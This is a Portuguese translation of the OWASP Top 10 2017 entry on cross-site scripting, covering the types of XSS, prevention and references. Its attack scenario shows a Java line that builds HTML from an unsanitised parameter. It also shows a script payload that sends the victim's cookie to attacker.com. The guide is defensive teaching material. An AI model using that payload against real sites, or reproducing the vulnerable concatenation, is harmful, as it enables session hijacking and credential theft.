# A7:2017 Cross-Site Scripting (XSS)

| Agentes de Ameaça/Vectores de Ataque | Fraquezas de Segurança           | Impactos               |
| -- | -- | -- |
| Nível de Acesso \| Exploração 3 | Prevalência 3 \| Deteção 3 | Técnico 2 \| Negócio |
| Ferramentas automáticas podem detectar e explorar todas as três formas de XSS, e existem muitas framewoeks de exploração disponíveis. | XSS é o segundo mais prevalente aspecto no OWASP Top 10, e encontra-se em cerca de dois terços de todas as aplicações. As ferramentas automáticas podem encontrar alguns problemas de XSS automaticamente, em particular em tecnologias maduras como o PHP, J2EE/JSP, e ASP.NET. | O impacto do XSS é moderado para as variantes de XSS reflectido e DOM XSS, e severo no caso do XSS armazenado, com execução remota de código no browser da vítima, para roubo de credenciais, sessões, ou entrega de malware à vítima. |

## Está a Aplicação Vulnerável?

Existem três formas de XSS, que afectam o browser das vítimas:

* **XSS Reflectido**: A sua aplicação ou API inclui as entradas não validadas e não limpas do utilizador como parte do HTML resultante ou então não existe um cabeçalho da política de segurança do conteúdo (_content security policy_) ([CSP](https://www.owasp.org/index.php/Content_Security_Policy)). Um ataque bem sucedido pode permitir a um atacante a execução de código arbitrário de HTML e Javascript no browser da vítima. Tipicamente o utilizador vai precisar de interagir com uma ligação, ou algum tipo de página controlada pelo utilizador, tais como publicidade maliciosa, "_watering pole attack_", ou algo semelhante.
* **XSS Armazenado**: A sua aplicação ou API armazena entradas não limpas do utilizador que são visualizadas mais tarde por outro utilizador ou administrador. O XSS armazenado é considerado frequentemente como sendo de elevado risco.
* **DOM XSS**: As frameworks de JavaScript, aplicações de página única, e APIs que dinamicamente incluam dados controlados por um atacante para uma página são vulneráveis a um DOM XSS. Idealmente, evitaria enviar dados controlados pelo atacante para APIs de Javascript inseguras.

Os ataques típicos de XSS incluem o roubo de sessões, roubo ou controlo de contas, ultrapassar factores de autenticação múltipla (MFA), substituição ou alteração de nós no DOM (tais como painéis de autenticação falsos), ataques contra o browser web do utilizador tais como o descarregar software malicioso, captura e registo de teclas ou outros ataques do lado do cliente.

## Como Prevenir?

Prevenir ataques de XSS requer a separação de dados não confiáveis do conteúdo activo de um browser.

* Usar frameworks seguras que limpam de forma automática o XSS por desenho, tal como acontece com o Ruby 3.0 ou React JS, ou então alavancar as proteções de XSS das frameworks.
* Limpar pedidos de dados HTTP não confiáveis baseado no contexto do resultado HTML (corpo, attribute, JavaScript, CSS, ou URL) resolverá as vulnerabilidades de XSS reflectido ou armazenado. O [OWASP XSS Prevention Cheat Sheet](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet) possui detalhes sobre as técnicas de limpeza de dados a serem realizadas.
* Aplicação de codificação sensível ao contexto aquando da modificação do documento no browser no lado do cliente pode proteger contra DOM XSS. Quando isto não pode ser evitado, técnicas semelhantes de limpeza sensível ao contexto podem ser aplicadas às API do browser tais como descritas em [OWASP DOM based XSS Prevention Cheat Sheet](https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet).
* Activar uma [Política de Segurança do Conteúdo (CSP - Content Security Policy)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) é uma defesa em profundidade para mitigar XSS, assumindo que não existem outras vulnerabilidades que permitam colocar código malicioso através da inclusão de ficheiros locais tais como is atravessar caminhos, ou bibliotecas vulneráveis em fontes permitidas, tais como redes de entrega de conteúdos ou bibliotecas locais. 

## Exemplos de Cenários de Ataque

**Scenario 1**: A aplicação usa dados não confiáveis na construção do seguinte trecho de HTML sem qualquer tipo de validação ou limpeza:

```
   (String) page += "<input name='creditcard' type='TEXT' value='" + request.getParameter("CC") + "'>";
```

O atacante modifica o parâmetro 'CC' no browser para:

```
><script>document.location='http://www.attacker.com/cgi-bin/cookie.cgi?foo='+document.cookie</script>'.
```

Este ataque força a que o ID de sessão da vítima seja enviado para o site web do atacante, permitindo que atacante possam raptar a sessão actual do utilizador.

De notar que os atacantes podem usar XSS para derrotar qualquer tipo de defesa automática baseada em CSRF que a aplicação use. 

## Referências

### OWASP

* [OWASP Proactive Controls: #3 Encode Data](https://www.owasp.org/index.php/OWASP_Proactive_Controls#tab=OWASP_Proactive_Controls_2016)
* [OWASP Proactive Controls: #4 Validate Data](https://www.owasp.org/index.php/OWASP_Proactive_Controls#tab=OWASP_Proactive_Controls_2016)
* [OWASP Application Security Verification Standard: V5](https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project)
* [OWASP Testing Guide: Testing for Reflected XSS](https://www.owasp.org/index.php/Testing_for_Reflected_Cross_site_scripting_(OTG-INPVAL-001))
* [OWASP Testing Guide: Testing for Stored XSS](https://www.owasp.org/index.php/Testing_for_Stored_Cross_site_scripting_(OTG-INPVAL-002))
* [OWASP Testing Guide: Testing for DOM XSS](https://www.owasp.org/index.php/Testing_for_DOM-based_Cross_site_scripting_(OTG-CLIENT-001))
* [OWASP Cheat Sheet: XSS Prevention](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet)
* [OWASP Cheat Sheet: DOM based XSS Prevention](https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet)
* [OWASP Cheat Sheet: XSS Filter Evasion](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)
* [OWASP Java Encoder Project](https://www.owasp.org/index.php/OWASP_Java_Encoder_Project)

### Externas

* [CWE-79: Improper neutralization of user supplied input](https://cwe.mitre.org/data/definitions/79.html)
* [PortSwigger: Client-side template injection](https://portswigger.net/knowledgebase/issues/details/00200308_clientsidetemplateinjection)
